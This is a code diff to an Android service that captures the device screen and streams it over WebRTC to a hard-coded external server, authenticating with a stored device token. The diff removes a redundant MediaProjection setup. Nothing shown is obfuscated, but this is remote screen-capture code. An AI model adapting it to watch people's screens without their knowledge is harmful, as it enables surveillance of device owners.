@@ -14,12 +14,10 @@ class ScreenCaptureService:Service(){
   const val EXTRA_DATA="result_data"
   const val ACTION_STOP="com.xxx.superapp.STOP_SCREEN"
  }
- private var projection:MediaProjection?=null
  private var webrtc:DroWebRtc?=null
 
  override fun onStartCommand(i:Intent?,flags:Int,startId:Int):Int{
   if(i?.action==ACTION_STOP){stopSelf();return START_NOT_STICKY}
-  val code=i?.getIntExtra(EXTRA_RESULT_CODE,-1)?:-1
   val data=i?.getParcelableExtra<Intent>(EXTRA_DATA)?:return START_NOT_STICKY
   val token=getSharedPreferences("dro_control",MODE_PRIVATE).getString("device_token",null) ?: run { stopSelf(); return START_NOT_STICKY }
 
@@ -32,15 +30,12 @@ class ScreenCaptureService:Service(){
   if(Build.VERSION.SDK_INT>=29) startForeground(2002,n,ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION) else startForeground(2002,n)
 
   try{
-   projection=(getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager).getMediaProjection(code,data)
-   if(projection==null){stopSelf();return START_NOT_STICKY}
-   projection!!.registerCallback(object:MediaProjection.Callback(){override fun onStop(){stopSelf()}},null)
-   webrtc=DroWebRtc(this,data,object:MediaProjection.Callback(){override fun onStop(){stopSelf()}},token,"https://market-intelligence-840b.onrender.com"){ }
+   webrtc=DroWebRtc(this,data,object:MediaProjection.Callback(){override fun onStop(){stopSelf()}},token,"https://market-intelligence-840b.onrender.com"){}
    webrtc!!.start()
-  }catch(e:Exception){stopSelf()}
+  }catch(_:Exception){stopSelf()}
   return START_STICKY
  }
 
- override fun onDestroy(){webrtc?.stop();webrtc=null;projection?.stop();projection=null;super.onDestroy()}
+ override fun onDestroy(){webrtc?.stop();webrtc=null;super.onDestroy()}
  override fun onBind(i:Intent?):IBinder?=null
 }
